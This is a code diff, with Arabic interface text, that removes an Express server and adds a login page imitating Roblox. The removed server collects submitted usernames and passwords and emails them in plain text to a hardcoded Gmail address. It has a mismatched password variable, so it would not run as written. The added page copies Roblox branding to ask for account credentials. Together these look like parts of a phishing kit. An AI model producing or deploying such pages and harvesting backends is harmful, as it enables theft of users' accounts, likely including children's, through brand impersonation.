@@ -1,63 +1,125 @@
-const express = require("express");
-const nodemailer = require("nodemailer");
-const { v4: uuidv4 } = require("uuid");
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+<meta charset="UTF-8">
+<title>Roblox Style Page</title>
 
-const app = express();
-app.use(express.json());
+<style>
+body{
+  margin:0;
+  font-family:Arial, sans-serif;
+  background:#000;
+  color:white;
+}
 
-const PORT = 3000;
+/* Top Bar */
+.topbar{
+  background:#111;
+  height:50px;
+  display:flex;
+  align-items:center;
+  padding:0 15px;
+}
 
-const ADMIN_EMAIL = "battal.alzahrani23@gmail.com";
-const ffffoe239 = "PUT_YOUR_APP_PASSWORD_HERE"; // App Password من Gmail
+.logo{
+  font-weight:bold;
+  margin-right:15px;
+}
 
-const requests = {};
+.menu a{
+  color:white;
+  margin:0 8px;
+  text-decoration:none;
+  font-size:14px;
+}
 
-const transporter = nodemailer.createTransport({
-  service: "gmail",
-  auth: {
-    user: ADMIN_EMAIL,
-    pass: APP_PASSWORD
-  }
-});
+.search{
+  margin-left:auto;
+}
 
-app.post("/request", (req, res) => {
-  const id = uuidv4();
-  requests[id] = { ...req.body, status: "pending" };
+.search input{
+  padding:5px;
+  border-radius:4px;
+  border:none;
+}
 
-  const approve = `http://localhost:${PORT}/approve/${id}`;
-  const reject  = `http://localhost:${PORT}/reject/${id}`;
+.btn-blue{
+  background:#1f7aff;
+  color:white;
+  padding:6px 12px;
+  border-radius:5px;
+  margin-left:10px;
+  text-decoration:none;
+}
 
-  transporter.sendMail({
-    to: ADMIN_EMAIL,
-    subject: "طلب تسجيل دخول جديد",
-    html: `
-      <h3>طلب جديد</h3>
-      <p>اسم المستخدم: ${req.body.name}</p>
-      <p>كلمة المرور: ${req.body.password}</p>
-      <a href="${approve}">✅ قبول</a><br><br>
-      <a href="${reject}">❌ رفض</a>
-    `
-  });
+.btn-dark{
+  background:#333;
+  color:white;
+  padding:6px 12px;
+  border-radius:5px;
+  margin-left:8px;
+  text-decoration:none;
+}
 
-  res.json({ id });
-});
+/* Login Box */
+.center{
+  height:calc(100vh - 50px);
+  display:flex;
+  justify-content:center;
+  align-items:center;
+}
 
-app.get("/approve/:id", (req, res) => {
-  if (requests[req.params.id])
-    requests[req.params.id].status = "approved";
-  res.send("تم القبول");
-});
+.box{
+  background:#202225;
+  padding:30px;
+  width:340px;
+  border-radius:10px;
+  text-align:center;
+}
 
-app.get("/reject/:id", (req, res) => {
-  if (requests[req.params.id])
-    requests[req.params.id].status = "rejected";
-  res.send("تم الرفض");
-});
+.box input, .box button{
+  width:100%;
+  padding:10px;
+  margin:8px 0;
+  border:none;
+  border-radius:5px;
+}
 
-app.get("/status/:id", (req, res) => {
-  res.json(requests[req.params.id] || { status: "not_found" });
-});
+.box button{
+  background:#00b06f;
+  color:white;
+  cursor:pointer;
+}
+</style>
+</head>
+<body>
 
-app.listen(PORT, () => {
-  console.log("Server running on http://localhost:" + PORT);
-});
+<div class="topbar">
+  <div class="logo">ROBLOX</div>
+
+  <div class="menu">
+    <a href="#">الرئيسية</a>
+    <a href="#">السوق</a>
+    <a href="#">إنشاء</a>
+    <a href="#">Robux</a>
+  </div>
+
+  <div class="search">
+    <input type="text" placeholder="بحث">
+  </div>
+
+  <a href="#" class="btn-dark">تسجيل الدخول</a>
+  <a href="#" class="btn-blue">تسجيل الدخول</a>
+</div>
+
+<div class="center">
+  <div class="box">
+    <h2>تسجيل الدخول</h2>
+    <input type="text" placeholder="اسم المستخدم / الإيميل">
+    <input type="password" placeholder="كلمة المرور">
+    <button>تسجيل الدخول</button>
+  </div>
+</div>
+
+</body>
+</html>
